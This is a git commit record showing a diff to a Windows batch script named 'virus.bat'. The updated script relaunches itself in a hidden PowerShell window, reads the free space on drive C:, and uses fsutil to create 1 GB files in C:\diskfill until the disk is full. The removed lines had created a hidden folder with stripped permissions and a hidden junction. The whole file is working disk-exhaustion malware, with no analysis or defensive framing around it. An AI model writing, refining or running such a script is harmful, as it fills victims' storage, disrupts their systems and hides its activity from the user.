9f0b264ffc3989df75e78f6ab783d3010805d221
IWO <saarleshembar@gmail.com>
2026-03-01 16:53:31 +0200

    Update virus.bat

--- virus.bat
+++ virus.bat
@@ -1,41 +1,25 @@
 @echo off
-setlocal enabledelayedexpansion
-
-set "TARGET=C:\diskfill"
-
 if "%1" neq "hidden" (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden'"
     exit
 )
-
+setlocal enabledelayedexpansion
+set "TARGET=C:\diskfill"
 if not exist "%TARGET%" mkdir "%TARGET%"
-
-for /f "skip=1 tokens=1" %%a in ('wmic logicaldisk where "DeviceID='C:'" get FreeSpace') do (
-    if not defined FreeSpace set FreeSpace=%%a
+set /a FILESIZE=1024*1024*1024
+for /f %%a in ('powershell -NoProfile -Command "(Get-PSDrive C).Free"') do set "FreeSpace=%%a"
+set /a FILECOUNT=FreeSpace / FILESIZE
+set /a REMAINDER=FreeSpace %% FILESIZE
+if %FILECOUNT% lss 1 set FILECOUNT=1
+set /a COUNT=1
+:CreateLoop
+if %COUNT% leq %FILECOUNT% (
+    fsutil file createnew "%TARGET%\file!COUNT!.bin" %FILESIZE%
+    set /a COUNT+=1
+    goto CreateLoop
 )
-
-set /a FreeMB=%FreeSpace%/1024/1024
-
-set /a SIZE=%FreeMB%*1024*1024
-
-set COUNT=1
-
-set "FOLDER=C:\Users\Public\ProtectedFolder"
-if not exist "%FOLDER%" mkdir "%FOLDER%"
-attrib +h +s "%FOLDER%"
-icacls "%FOLDER%" /inheritance:r
-icacls "%FOLDER%" /remove:g Users
-icacls "%FOLDER%" /remove:g Everyone
-icacls "%FOLDER%" /remove:g Guests
-
-set "JUNC=C:\Users\Public\ProtectedFolder_Link"
-if exist "%JUNC%" rd /Q /S "%JUNC%"
-mklink /J "%JUNC%" "%FOLDER%"
-attrib +h +s "%JUNC%"
-
-echo Creating file !COUNT! ...
-fsutil file createnew "%TARGET%\file!COUNT!.bin" %SIZE%
-set /a COUNT+=1
-
+if %REMAINDER% gtr 0 (
+    fsutil file createnew "%TARGET%\file!COUNT!.bin" %REMAINDER%
+)
 echo Done.
 pause
